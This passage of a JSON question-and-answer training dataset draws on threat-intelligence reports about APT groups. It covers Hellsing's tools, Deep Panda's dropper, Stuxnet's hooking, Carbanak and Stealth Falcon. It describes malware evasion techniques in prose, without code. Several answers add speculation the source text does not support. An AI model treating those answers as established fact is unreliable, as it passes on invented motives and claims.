    "instruction": "Big Headline: Other tools\nOnce the Hellsing attackers compromise a computer, they deploy other tools which can be used for gathering further information about the victim or doing lateral movement. One such tool is \"test.exe\":\nThis tool is used to gather information and test available proxies. Interestingly, it also contains the Hellsing debug path:\nAnother attack tool deployed in a victim's environment was a file system driver, named \"diskfilter.sys\", although internally it claims to be named \"xrat.sys\". The driver is unsigned and compiled for 32\u00adbit Windows. It was used briefly in 2013, before being abandoned by the attackers, possibly due to Windows 7 driver signing requirements:\nAnother tool used by the attackers is called \"xKat\":\nThis is a powerful file deletion and process killer which uses a driver (Dbgv.sys) to perform the operations. We've seen it being used by the attackers to kill and delete malware belonging to their competitors.\nSome of the debug paths found in the binaries include:\ne:\\Hellsing\\release\\clare.pdb\ne:\\Hellsing\\release\\irene\\irene.pdb\nd:\\hellsing\\sys\\irene\\objchk_win7_x86\\i386\\irene.pdb\nd:\\hellsing\\sys\\xkat\\objchk_win7_x86\\i386\\xKat.pdb\nd:\\Hellsing\\release\\msger\\msger_install.pdb\nd:\\Hellsing\\release\\msger\\msger_server.pdb\nd:\\hellsing\\sys\\xrat\\objchk_win7_x86\\i386\\xrat.pdb\nD:\\Hellsing\\release\\exe\\exe\\test.pdb\nBig Headline: Conclusions\nThe Hellsing APT group is currently active in the APAC region, hitting targets mainly in the South China Sea area, with a focus on Malaysia, the Philippines and Indonesia. The group has a relatively small footprint compared to massive operations such as \"Equation\". Smaller groups can have the advantage of being able to stay under the radar for longer periods of time, which is what happened here.\nThe targeting of the Naikon group by the Hellsing APT is perhaps the most interesting part. In the past, we've seen APT groups accidentally hitting each other while stealing address books from victims and then mass\u00admailing everyone on each of these lists. But, considering the timing and origin of the attack, the current case seems more likely to be an APT\u00adon\u00adAPT attack.\nTo protect against a Hellsing attack, we recommend that organisations follow basic security best practices:\nDon't open attachments from people you don't know\nBeware of password\u00adprotected archives which contain SCR or other executable files inside\nIf you are unsure about the attachment, try to open it in a sandbox\nMake sure you have a modern operating system with all patches installed\nUpdate all third party applications such as Microsoft Office, Java, Adobe Flash Player and Adobe Reader\nKaspersky Lab products detect the backdoors used by the Hellsing attacker as:\nKaspersky Lab products detect the backdoors used by the Hellsing attacker as:\nHEUR:Trojan.Win32.Generic, Trojan\u00adDropper.Win32.Agent.kbuj, Trojan\u00ad\nDropper.Win32.Agent.kzqq.\nDeny the Hellsing APT by default\nQuestion: How did the Hellsing APT group use the 'xKat' tool in their operations? Why might this tool be particularly effective against other APT groups?",
    "output": "Answer: The Hellsing APT group used the 'xKat' tool as a powerful file deletion and process killer. This tool utilizes a driver (Dbgv.sys) to perform its operations. The effectiveness of 'xKat' lies in its ability to eliminate malware belonging to competing APT groups. By using this tool, Hellsing can disrupt the operations of other threat actors, potentially gaining an advantage in their own campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the dropper used by Deep Panda operate to install and execute the Milestone backdoor, and what techniques does it employ to evade detection?",
    "output": "The dropper used by Deep Panda writes three files to the disk: a benign executable (syn.exe), a Milestone loader (newdev.dll), and a driver (crtsys.sys). The payloads are stored XOR-encrypted and LZMA-compressed, with a hardcoded DWORD as the XOR key. The dropper carries two builds of the driver for 32-bit and 64-bit systems and installs the appropriate build as a driver named FSFilter-Min using the Service Control Manager (SCM) API. It then patches the .data section of the loader binary with its configuration before writing it to disk. The dropper executes syn.exe, a benign executable signed by Synaptics, to side-load the newdev.dll loader module. The loader contains a XOR-encrypted and LZMA-compressed payload, which is the Milestone backdoor. It decrypts the configuration with XOR 0xCC and patches the backdoor's .data section with it. Finally, the loader reflectively loads the Milestone backdoor and calls its exports. The dropper employs evasion techniques such as using a benign signed executable to side-load the malicious DLL and encrypting the payloads to avoid detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: 4 Ukraine\nMany of these quotes came from the President of Russia's website, and are directly attributable to Vladimir Putin. However, most of the conflict-related quotes in this section \u2013 from the President of Ukraine's website \u2013 are from news articles and press releases that quote Ukrainian President Petro Poroshenko. Unlike on the Russian site, full-length Ukrainian speeches are a smaller proportion of the presidential communications. That said, Ukraine has been much clearer than Russia in identify-\ning cyberspace as a separate and active domain of conflict. Various terms have been used, such as 'cyber security',19 'informational cyber-security system of Ukraine',20 and 'cyber and information security'. 21 These terms may refer to slightly different things at different times, but in general, there was more cyber warfare-related content to analyse.\n13 'APT28 \u2013 A Window Into Russia's Cyber Espionage Operations?' FireEye, https://www2.fireeye.com/apt28.html.\n14 Owen Matthews. 'Russia leading the way in the cyber arms race,' Irish Examiner, 13 June 2015, http://www.irishexaminer.com/ lifestyle/features/big-read-russia-leading-the-way-in-the-cyber-arms-race-336675.html.\n15 'Interview to Prensa Latina and ITAR-TASS' Website of the President of Russia, 11 July 2014, http://en.kremlin.ru/events/ president/news/46190.\n16 'On the start of contacts with Ukraine's Choice public movement in Donetsk and Lugansk' Website of the President of Russia, 22 June 2014, http://en.kremlin.ru/events/president/news.\n17 'The 'Putin Plan' for settling the conflict in Ukraine' Website of the President of Russia, 3 September 2014, http://en.kremlin. ru/events/president/news/46554.\n18 'Instructions regarding the situation in Ukraine' Website of the President of Russia, 27 February 2014, http://en.kremlin.ru/ events/president/news/20347.\nUkraine has been much clearer than Russia in identifying cyberspace as a separate and active domain of conflict.\nFrom the beginning of the conflict, Ukraine has suffered a variety of network attacks. In February 2014, the Ukrainian telecommunications firm Ukrtelecom reported that 'unknown people'22 had damaged a fibre backbone cable that resulted in the loss of communication between Crimea and the rest of Ukraine. Not long after, Ukrainian security chief Valentyn Nalivaichenko announced, 'I confirm that an ... attack is under way on mobile phones of members of the Ukrainian parliament for the second day in a row'. 23 The most sophisticated attack came against the Ukrainian Central Election Commission (CEC) during Ukraine's Presidential elections.24 However, there was no official attribution for any of these attacks provided by the government in Kyiv.\nThere were at least two cases of cyber attack attribution, both to Russia. The Security Service of Ukraine linked the disruption of mobile communications and the defacement of websites to pro-Russian hackers and to pro-Russian forces in Crimea. There was no direct link made to Moscow, perhaps in part because the 'IP-telephonic' attack was aimed at top Ukrainian politicians irrespective of their political allegiance.25 On another occasion, when the hacktivist group CyberBerkut claimed responsibility for an attack on German government websites, Ukrainian Prime Minister Arseny Yatseniuk placed the blame on Russian intelligence: 'I strongly recommend that the Russian secret services stop spending taxpayer money for cyberattacks against the Bundestag and Chancellor Merkel's office'. 26\nIn the case of downed Malaysian airliner MH17, which Poroshenko called terrorism,27 the President stated that 'The State Security Service of Ukraine has inter-\ncepted a conversation in which one of the leaders of the mercenaries boasted about bringing down the plane in his reporting to his Russian supervisor, a colonel of the General Intelligence Unit of Russia's Armed Forces'28 and 'terrorists have already declared their desire to hide the evidence and transport the aircraft's black boxes to Moscow'. 29\n19 'President met with U.S. Congress delegation,' Office of the President of Ukraine, 6 August 2014 http://www.president.gov.ua/ en/news/prezident-zustrivsya-z-delegaciyeyu-kongresu-ssha-35766.\n20 'NSDC decision: Ukraine asks the UN, NATO, EU, OSCE and strategic partners for help,' Office of the President of Ukraine, 28 August 2014, http://www.president.gov.ua/en/news/ukrayina-zvertayetsya-za-dopomogoyu-do-oon-nato-yes-ob-sye-de-33573.\n21 'Presidents of Ukraine and Lithuania have held the Seventh session of the Council of Presidents' Office of the President of Ukraine, 24 November 2014. http://www.president.gov.ua/en/news/prezidenti-ukrayini-i-litvi-proveli-some-zasidannya-ra-di-pre-34105.\n22 Ukrtelecom. 'Ukrtelecom's Crimean sub-branches officially report that unknown people have seized several telecommunications nodes in the Crimea,' 28 February 2014, http://en.ukrtelecom.ua/about/news?id=120467.\n23 Dave Lee. 'Russia and Ukraine in cyber 'stand-off ',' BBC News, 5 March 2014 http://www.bbc.com/news/technology-26447200.\n24 SRK/NN/SS, 'Hackers attack Ukraine election website,' PressTV,\n25 October 2014, http://www.presstv.com/de-tail/2014/10/25/383623/ukraines-election-website-hacked.\n25 Max Smolaks. 'Security Service Of Ukraine Claims Politicians' Phones Are Under Attack,' TechWeek Europe, 4 March 2014, http://www.techweekeurope.co.uk/workspace/security-service-ukraine-claims-politicians-phones-attack-140643.\n26 Erik Kirscbaum. 'Ukraine says Russia behind cyber attack on German government,' Reuters, 8 January 2015, http://www. reuters.com/article/2015/01/08/us-germany-cyberattack-idUSKBN0KH0IY20150108.\n27 'Address of the President on the occasion of the crash of Malaysia Airlines aircraft,' Office of the President of Ukraine, 18 July 2014, http://www.president.gov.ua/en/news/zvernennya-prezidenta-z-privodu-tragediyi-z-litakom-aviakomp-33262.\nIn eastern Ukraine, Poroshenko contends that the separatist movement is 'fully controlled' by Russian leadership30 and even in government-controlled territory, he announced that '[t]he Security Service of Ukraine unmasked and neutralised the terrorist group coordinated by special forces of the Russian Federation'. 31\nTo international audiences, Poroshenko has focused primarily on the broader topic of hybrid warfare.\nTo international audiences, Poroshenko has focused primarily on the broader topic of hybrid warfare, taking care to fit within the narratives and terminology of the West. At the 2015 Munich Security Conference, he said that '[f]or over a year Ukraine has been facing dramatic consequences of an undeclared hybrid warfare. It is very important that the states in the region devote more attention to hybrid threats. [\u2026] Today, a former strategic partner is waging a hybrid war against a sovereign state, a co-founder of the United Nations. Mounds of lies and propaganda have been heaped into a wall of hatred, erected between two once friendly nations'. 32 While analysts have yet to agree on a common definition of hybrid warfare, it certainly encompasses Internet-based propaganda, information operations, and computer hacking.\nLooking toward the future, Poroshenko has positioned himself as a 'President of Peace'33 'on the forefront of the global fight for democracy'. 34  Russia is the clear antagonist: 'all military threats and challenges are related to Russia,'35 and Moscow's war 'has brought Ukraine to the brink of its survival'. 36 Poroshenko argues that not just Ukraine, but the whole world needs a resolution to this conflict,37 and that 'democracies must support each other'. 38 Ultimately, Ukraine's national security goal is 'full\nNATO membership'. 39 The President asserted that 'Ukraine is not a NATO member now. Unfortunately, we are not allies de jure. Yet, de facto we are more than just partners \u2026 Ukraine is the eastern outpost of Euro-Atlantic civilisation, which is now defending not only sovereignty, territorial integrity and independence of our country.'40\n28 Ibid.\n29 Ibid.\n30 'President's statement on ceasefire from February 15,' Office of the President of Ukraine, 15 February 2015, http://www.presi-dent.gov.ua/en/news/zayava-prezidenta-pro-pripinennya-vognyu-z-0000-15-lyutogo-34723.\n31 'Head of the Security Service of Ukraine reports to the President: Terrorist group coordinated by Russian special forces was neutralized,' Office of the President of Ukraine, 16 August 2014, http://www.president.gov.ua/en/news/zneshkodzheno-teror-istichnu-grupu-yaku-koordinuvali-specsluz-33478.\n32 'Speech by President of Ukraine Petro Poroshenko at the Munich Security conference,' Office of the President of Ukraine, 7 February 2015, http://www.president.gov.ua/en/news/vistup-prezidenta-ukrayini-petra-poroshenka-na-myunhenskij-k-34663.\n33 Petro Poroshenko. Speech by President of Ukraine Petro Poroshenko at the Munich Security Conference 2015.\n34 Petro Poroshenko. 'Address by the President of Ukraine Petro Poroshenko to the Joint Session of the United States Congress,' 18 September 2014, http://www.president.gov.ua/en/news/vistup-prezidenta-ukrayini-petra-poroshenka-na-spilnij-sesiy-33718.\n35 'President: New Military Doctrine is based on the duration of threat from Russia and demands full compatibility of the Armed Forces with NATO standards,' Office of the President of Ukraine, 2 September 2015, http://www.president.gov.ua/en/news/ nova-voyenna-doktrina-vihodit-z-trivalosti-zagrozi-z-boku-ro-35907.\n36 Ibid.\n37 Petro Poroshenko. President's statement on ceasefire from February 15 2015.\n38 Petro Poroshenko. Address by the President of Ukraine Petro Poroshenko to the Joint Session of the United States Congress 2014.\n\nQuestion: Why did Ukraine identify cyberspace as a separate and active domain of conflict, and what specific terms did they use to describe it?\n\nAnswer:",
    "output": "Ukraine identified cyberspace as a separate and active domain of conflict to emphasize the importance of cybersecurity in the ongoing conflict. They used various terms such as 'cyber security', 'informational cyber-security system of Ukraine', and 'cyber and information security'. These terms highlight the multifaceted nature of cyber threats and the need for comprehensive strategies to address them.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: 6.3. Additional UAE Infrastructure\nRecall that our first window into this infrastructure came from our Stealth Falcon research, when we identified the smser.net domain, fingerprinted it, and traced it to 237 live IP addresses that shared the same characteristics (Section 5.1).\nUsing (<https://www.passivetotal.org/>)PassiveTotal, we were able to further trace smser.net to seven other domains, indicating Stealth Falcon targeting that appeared to use NSO Group's Pegasus solution in Qatar (<https://citizenlab.org/2016/05/stealth-falcon/>)(ooredoodeals.com), UAE (alawaeltech.com, which ), and Bahrain (bahrainsms.co). Based on our previously published research, we believe there is strong circumstantial evidence to support the conclusion that the operator of Stealth Falcon is connected to an entity within the UAE Government.\nWe also identified five .ae TLDs that all shared the same registrant name (\"Gerald Binord\"), which may have been used to target people in the UAE. We further identified another group of domains including damanhealth.online (\"Daman Health\" is a (<https://en.wikipedia.org/wiki/Daman_(health_insurance_company)>)UAE-based health insurer) and uaenews.online, which also included a domain turkeynewsupdates.com, suggesting an operator that is targeting both UAE and Turkey targets.\n\nHow did the researchers initially identify and trace the smser.net domain, and what additional domains were found to be linked to it through PassiveTotal? What does this suggest about the scope and targets of the Stealth Falcon operation using NSO Group's Pegasus solution?",
    "output": "The researchers initially identified the smser.net domain during their Stealth Falcon research. They fingerprinted the domain and traced it to 237 live IP addresses that shared the same characteristics. Using PassiveTotal, they further traced smser.net to seven other domains, including ooredoodeals.com in Qatar, alawaeltech.com in the UAE, and bahrainsms.co in Bahrain. This indicates that the Stealth Falcon operation was targeting individuals in multiple countries using NSO Group's Pegasus solution. Additionally, the researchers identified five .ae TLDs sharing the same registrant name ('Gerald Binord'), likely used to target people in the UAE. Another group of domains, including damanhealth.online and uaenews.online, also included turkeynewsupdates.com, suggesting that the operator was targeting both UAE and Turkey.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do Advanced Persistent Threat (APT) groups like Carbanak and Naikon exploit vulnerabilities like CVE-2012-0158 to gain unauthorized access to financial institutions and other organizations?",
    "output": "CVE-2012-0158 is a vulnerability in Microsoft Office that allows remote attackers to execute arbitrary code via a crafted web site, Office document, or .rtf file. APT groups like Carbanak and Naikon have exploited this vulnerability to gain unauthorized access to financial institutions and other organizations. Specifically, Carbanak used spear phishing emails with malicious Microsoft Word documents to infect victim systems, exploiting vulnerabilities in Microsoft Word 2003, 2007, and 2010, including CVE-2012-0158. Similarly, Naikon used spear phishing emails with malicious Microsoft Word documents that contained a CVE-2012-0158 exploit, an executable with a double extension, or an executable with an RTLO filename. Once the vulnerability is exploited, the attackers can install malware and establish a backdoor connection to the victim's system, allowing them to steal sensitive information and conduct further malicious activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Stuxnet APT use hooking to evade detection and inject code into processes?",
    "output": "Hooking is a technique used by adversaries to redirect calls to application programming interface (API) functions for execution and privilege escalation means. In the case of the Stuxnet APT, hooking is used to evade detection and inject code into processes. Specifically, Stuxnet hooks into various API functions, including ZwMapViewOfSection, ZwCreateSection, ZwOpenFile, ZwClose, ZwQueryAttributesFile, and ZwQuerySection, to load its own modules and inject code into processes. This is done by modifying the import address table (IAT) of the process, where pointers to imported API functions are stored. By hooking these functions, Stuxnet is able to load its own modules as if they were legitimate libraries, reducing the probability of detection by heuristic methods. Additionally, Stuxnet uses hooking to hide its files on removable drives by filtering results from querying information about files and subdirectories. Overall, Stuxnet's use of hooking allows it to remain stealthy and evade detection while carrying out its malicious activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: blind eagle\nAPT-C-36 (Blind Eagle) is an APT organization suspected to come from South America. Its main targets are located in Colombia and some areas of South America such as Ecuador and Panama. Since its discovery in 2018, the organization has continued to launch targeted attacks against government departments, finance, insurance and other industries as well as large companies in Colombia.\nDuring the tracking of the APT-C-36 organization, we found that the organization is constantly trying new attack streams and trying to add the Amadey botnet Trojan to its arsenal.\nQuestion: Why did APT-C-36 (Blind Eagle) choose to incorporate the Amadey botnet Trojan into their attack strategies, and how does this decision reflect their evolving tactics?",
    "output": "Answer: APT-C-36 (Blind Eagle) chose to incorporate the Amadey botnet Trojan into their attack strategies as part of their continuous efforts to innovate and diversify their attack methods. This decision reflects their evolving tactics aimed at enhancing their capabilities and effectiveness in targeting various sectors, including government departments, finance, insurance, and large companies in Colombia and other parts of South America. By adding the Amadey botnet Trojan to their arsenal, Blind Eagle demonstrates a commitment to staying ahead of defensive measures and maintaining the potency of their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Oracle Customer Notification\nAccording to media , Oracle Security provided a notification to Oracle MICROS customers on 8 August 2016, informing them of the following:\n\uf0a7 Oracle Security has detected and addressed malicious code in certain legacy MICROS systems\n\uf0a7 Oracle has confirmed that it's investigating a breach of its Micros division.\n\uf0a7 Oracle's own systems, corporate network, and other cloud and service offers were not impacted.\n\uf0a7 Oracle MICROS users will have to change their account passwords immediately\n\uf0a7 The company reportedly stated that payment data was not at risk, as that information is encrypted both at rest and in transit in the MICROS environment.\nAlthough Oracle has not provided additional details on the exact date or extent of the breach of Oracle MICROS, some media suggest that the support portal for MICROS clients was also compromised.\nMedium Headline: Carbanak\nOn 8 August 2016, a media reported that the \"Oracle's MICROS customer support portal was seen communicating with a server known to be used by the \"Carbanak.\"\nAccording to , in February 2015, the Carbanak group used techniques commonly seen in Advanced Persistent Threat (APT) incidents to successfully target one financial institution's (a bank) money processing services, Automated Teller Machines (ATM) and financial accounts. In some cases, Oracle\ndatabases were manipulated to open payment or debit card accounts at the same bank or to transfer money between accounts using the online banking system. The ATM network was also used to dispense cash from certain ATMs at certain times where money mules were ready to collect it as part of this operation.\nIn March 2015, provided an industry-wide public alert and mitigation guidance concerning Carbanak. Visa recommends that all financial institutions and retailers scan their networks for the presence of Carbanak. If detected, please contact law enforcement immediately and activate security incident procedures.\nBig Headline: 2. Mitigation action recommended for Oracle Micros Customers\n\u2022 Change passwords for any account used by a MICROS representative to access the customer's on-premises systems.\n\u2022 Scan network for the following:\n\u2013 Psexec file\n\u2013 Files with .bin extension (located in \\All users\\%AppData%\\Mozilla\\ or c:\\ProgramData\\Mozilla\\)\n\u2013 Svchost.exe file (located in Windows\\System32\\com\\catalogue\\)\n\u2013 Svchost.exefile (located in C:\\ProgramData\\Mozilla\\svchost.exe)\n\uf0a7 This file provided remote access functions, such as the ability to execute arbitrary commands, upload/download files.\n\u2013 Operating system (Windows) running services ending in \"sys\"\n\u2022 Scan networks for IOCs linked to Carbanak:\n\u2022 Scan networks for IOCs linked to MalumPOS:\n\u2022 Additionally, Visa recommends the following best practices to reduce the risk of exposure:\n\u2013 Educate employees how to avoid phishing scams and opening emails with attachments\n\u2013 Maintain updates for all software and patches (address zero day vulnerabilities)\n\u2013 Turn on heuristics (behavioral analysis) on anti-malware to search for suspicious behavior\nVisa will continue to report any mitigation guidance, technical indicators of compromise associated with this compromise, or additional details on the overall extent of the compromise as details are made available.\nFor questions and information please contact,\nTo report a data breach, contact Visa Fraud Control:\n\u2022 Asia Pacific Region, Central Europe/Middle East/Africa Region: VIFraudControl@visa.com\n\u2022 U.S. and Canada: USFraudControl@visa.com\n\nQuestion: What are the key mitigation actions recommended by Visa for Oracle MICROS customers to secure their systems following the detection of malicious code, and why are these steps important?\n\nAnswer:",
    "output": "Visa recommends several key mitigation actions for Oracle MICROS customers: changing passwords for any account used by a MICROS representative to access the customer's on-premises systems; scanning the network for specific files and services such as Psexec, .bin files, svchost.exe, and operating system services ending in 'sys'; and scanning networks for Indicators of Compromise (IOCs) linked to Carbanak and MalumPOS. These steps are important because they help ensure that any compromised credentials are no longer usable, identify and remove potential backdoors or malicious files, and detect the presence of known threats associated with the breach. Additionally, Visa recommends educating employees about phishing scams, maintaining software updates and patches, and turning on heuristics on anti-malware to search for suspicious behavior, which are essential best practices for reducing the risk of exposure to cyber threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: 1. The latest APT campaign of Geumseong121 Group \u2013 'Operation Rocket Man'\nESTsecurity Security Response Center (ESRC) is a specialized organization of ESTsecurity Cyber Threat Intelligence (CTI).\nOn March 20, ESRC released the report on a state-sponsored APT threat group Geumseong121, who had conducted infiltration cyber-attacks on major North Korean organizations and defense sectors, recently carried out the Android-based mobile Spear Phishing attacks.\n[Figure 1] Attack Vector of Geumseong121 group\nThe unknown attackers spread the CVE-2018-4878 Zero-Day vulnerability via KakaoTalk messenger and attempted the targeted attacks several times exploiting the malicious HWP document.\nIn the mobile spear phishing (APK) discovered in March, malicious APK apps with the word \"Secret\" instead of \"Illegal\" were distributed.\nThe Geumseong121 group is the suspected state-sponsored cyber military, who attacked Android mobile users by disguising as a mobile vaccine app developed by the leading portal company in Korea. ESRC in detail.\n[Figure 2] Tricking users to install APK disguised as the mobile security app\nThe additional threats related the issue has been posted on the , security blog in detail.\n\nBased on the above text, answer a question. How did the Geumseong121 group leverage the CVE-2018-4878 Zero-Day vulnerability to conduct targeted attacks, and what was the significance of using the term 'Secret' in their mobile spear phishing campaign?",
    "output": "The Geumseong121 group leveraged the CVE-2018-4878 Zero-Day vulnerability by spreading it through the KakaoTalk messenger and attempting targeted attacks multiple times using a malicious HWP document. In their mobile spear phishing campaign, they distributed malicious APK apps that used the term 'Secret' instead of 'Illegal.' This tactic was significant because it aimed to trick users into believing they were installing a legitimate mobile security app, thereby increasing the likelihood of successful infiltration. The group disguised their malicious app as a mobile vaccine app developed by a leading portal company in Korea, further enhancing its credibility and making it more appealing to potential victims.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do APT groups like APT33 and APT35 use spearphishing links to gain access to victim systems, and what tactics do they employ to evade detection?",
    "output": "Phishing: Spearphishing Link is a tactic used by adversaries to send spearphishing emails with a malicious link in an attempt to gain access to victim systems. APT groups like APT33 and APT35 have been observed using spearphishing links to deliver malware and gain access to victim systems. According to the Fireeye Mtrends 2018 report, APT33 has used spearphishing emails with links to malicious HTML application (HTA) files, which contained job descriptions and links to job postings on popular employment websites. The HTA files also contained malicious content that downloaded a custom APT33 backdoor from an attacker-controlled domain. APT35 has also used spearphishing links to deliver malware, including the PUPYRAT backdoor, which communicated with known APT35 infrastructure. To evade detection, these APT groups employ tactics such as using seemingly benign links that abuse special characters to mimic legitimate websites, and utilizing links to perform consent phishing, which allows them to steal application access tokens. Additionally, they may use domain fronting, a technique that hides CnC traffic in what appears to be legitimate requests for popular websites, making it difficult to detect and block their malicious activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 6 Troll Farming\nWho tweets in support of politics? Who posts Facebook updates in support of military operations? Of course, there are millions of true believers in the world, adherents to every cause under the sun. However, it is also possible to fabricate support for anything, especially in cyberspace. The social media offers great opportunities for state and non-state actors to use fake identities or automatically generated accounts to disseminate their narrative to audiences as widely as possible.\nOn 24 May 2014, hacked and leaked email correspondence (revealed on b0ltai. org) allegedly from a company called the 'Internet Research Agency' in St. Petersburg, Russia, offered evidence of the existence of a professional 'troll farm', including the firm's relationship to the Russian Government. Media reports suggested that recruitment of employees had occurred prior to the onset of military operations, and that workers were tasked with writing 100 internet posts per day.18\nFor strategic communications, these developments are critical to understanding modern information operations including disinformation and PSYOPS, as a well-orchestrated social media campaign could significantly affect the prevailing political narrative.\nIt is possible to analyse the social media domain in an effort to separate fact from fiction, to investigate when accounts were created, whether they have credible content or a real networks of real friends, but to do this accurately and in a timely manner is an extraordinary challenge for anyone, including law enforcement and counterintelligence organisations.19\nSmall Headline: 7 Conclusion\nSocial media is extensively used to support military actions on the ground.\nThe suspicious and seemingly targeted use of social media in the Russian-Ukrainian conflict offers considerable evidence that social media is being extensively used to support military actions on the ground. To some degree, the information operations have generated fear, uncertainty, and doubt about the economic, cultural, and national security of Ukraine, especially in the eastern provinces where there are strong historical ties to Russia.\nThe goal of these social media operations may be to convince Ukrainians that the Euromaidan movement has led only to political chaos in the country, and has not been in Ukraine's best long-term interests. This message can be contrasted with\nsome examples of social media commentary from Crimea: that its incorporation into Russia has led to safety and stability on the Crimean peninsula.\n18 \u0410\u043b\u0435\u043a\u0441\u0430\u043d\u0434\u0440\u0430 \u0413\u0430\u0440\u043c\u0430\u0436\u0430\u043f\u043e\u0432\u0430, '\u0413\u0434\u0435 \u0436\u0438\u0432\u0443\u0442 \u0442\u0440\u043e\u043b\u043b\u0438. \u0418 \u043a\u0442\u043e \u0438\u0445 \u043a\u043e\u0440\u043c\u0438\u0442', Novaya Gazeta, September 9, 2013, (<http://www.novayagazeta.ru/politics/59889.html>)http://www.novayag-(<http://www.novayagazeta.ru/politics/59889.html>)azeta.ru/politics/59889.html.\n19 Kenneth Geers and Roelof Temmingh. 'Virtual Plots, Real Revolution,' The Virtual Battlefield: Perspectives on Cyber Warfare, ed. Kenneth Geers and Christian Czosseck, 294-302 (Tallinn: NATO CCD COE, 2009).\nThe use of cyberspace both to attack the infrastructure and to influence 'people's hearts and minds' is a new phenomenon that has been increasingly used in recent conflicts to support military operations on the ground. This kind of warfare will not disappear; on the contrary the combination of actions which are targeted at infrastructure and human psychology will be used in more sophisticated and unpredictable ways in the future. A three step approach could be recommended for security experts and national decision makers to prepare better to meet these kind of challenges:\nIdentify. Governments and defence organisations should enhance their capabilities to identify the detrimental use of social media. Information campaigns which entail propaganda and automated or fake accounts to rapidly disseminate information should be closely monitored and analysed. This also includes additional efforts in order to understand how these campaigns are organised and what effects they can have on public perception.\nChallenge. Examples by citizen journalists have shown that revealing false facts to the public is an effective approach in mitigating the effects of disinformation. At the same time it is important not to engage in counter-propaganda as this fuels the information war and creates public distrust rather than diminishing the power of misinformation. Humour perhaps could be more helpful in countering aggressive propaganda as it hampers the ability to achieve its aim \u2013 subduing the society of the target country. The initiatives in Twitter like (<https://twitter.com/darthputinkgb>)@Darth-(<https://twitter.com/darthputinkgb>)PutinKGB or (<https://twitter.com/sputnik_intl>)@Sputnik_Intl are good examples of how to challenge Russia's disinformation campaign with irony and jokes.\nLearn and prepare. The development of the unifying strategic narrative \u2013 the story which entails the set of the values and beliefs of your country or organisation \u2013 is the best defence against propaganda which questions them. A long-term educational effort to enhance critical thinking and media (including social media) literacy would also contribute greatly to society's self-defence against manipulation.\nSmall Headline: 1 Introduction\nSince the end of the Cold War, there has been a proliferation in online criminal activity in Eastern Europe, and Ukraine is no exception. Famous for its hacker community, Ukraine ranks among the Top 10 countries in the world in cyber crime1 and number 15 as a source of Distributed Denial of Service (DDoS) attacks.2 In 2012, five Ukrainian nationals stole more than $72 million from U.S. bank accounts;3 in 2013, Ukrainian hackers stole 40 million sets of debit and credit card details from the US retail chain Target;4 in 2014, the RAND Corporation wrote that Russian and Ukrainian (the primary language of Ukraine) were the lingua franca of online hacker forums.5 In this light, it is natural to wonder if Ukraine is today a safe haven for cyber criminals.\nTo be sure, there have been some law enforcement successes, such as when numerous European countries and Europol (with the aid of the Ukrainian government) arrested five hackers who stole at least \u20ac2 million from banks all around the world.6 However, there are major countervailing factors at play in Ukraine, which include ongoing political, military, and economic crises and the absence of zhyvoii\npotreby (urgent need),7 which together provide little hope that Ukraine will be able to climb down from its perch atop the world's cyber crime ladder in the near future.\n1 Victor Zhora, e-mail to the author, July 30, 2015.\n2 '\u0423\u043a\u0440\u0430\u0438\u043d\u0430 \u0432\u043e\u0448\u043b\u0430 \u0432 \u0440\u0435\u0439\u0442\u0438\u043d\u0433 \u0441\u0442\u0440\u0430\u043d \u0441 \u043d\u0430\u0438\u0431\u043e\u043b\u044c\u0448\u0438\u043c \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e\u043c DDoS-\u0430\u0442\u0430\u043a.'\u00a0Minfin, June 8, 2015.http://minfin.com. ua/2015/06/08/7407564/.\n3 Taylor Armerding. 'Ukraine Seen as a Growing 'haven for Hackers' March 13, 2012. http://www.csoonline.com/article/2131155/network-security/ukraine-seen-as-a-growing--haven-for-hackers-.html.\n4 Charles Riley and Jose Pagliery. 'Target Will Pay Hack Victims $10 Million.' CNNMoney. March 19, 2015. http://money.cnn. com/2015/03/19/technology/security/target-data-hack-settlement/.\n5 Lillian Ablon, Martin C. Libicki, and Andrea A. Golay. Markets for Cybercrime Tools and Stolen Data: Hackers' Bazaar. Rand Corporation, 2014.\n6 Supra, note 4.\nIn many ways, Ukraine is a perfect case study to examine the vexing dynamics of cyber crime.\nIn many ways, Ukraine is a perfect case study to examine the vexing dynamics of cyber crime. Its government has few cyber security regulations, its society is home to talented computer programmers, and its economy is struggling. This chapter begins with a brief description of Ukraine's current cyber crisis, to include the primary reasons why cyber crime flourishes there. Next, it discusses the future of the region based on interviews with Ukrainian and Western cyberse-curity experts from public and private sectors and academia. Finally, the chapter ends with recommendations based on best practices in cyber security \u2013 all of which can help Kyiv to improve its cyber security posture. Beyond Ukraine, these insights can be applied to numerous other countries in the region.\n\nHow do troll farms, such as the Internet Research Agency in St. Petersburg, Russia, operate and what impact can they have on strategic communications and information operations?",
    "output": "A: Troll farms, like the Internet Research Agency in St. Petersburg, employ individuals to create and manage fake identities or automated accounts on social media platforms. These accounts are used to disseminate specific narratives and propaganda to influence public opinion. The impact of these operations can be significant, as a well-orchestrated social media campaign can alter the prevailing political narrative, generate fear, uncertainty, and doubt, and ultimately affect the economic, cultural, and national security perceptions of a target audience.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
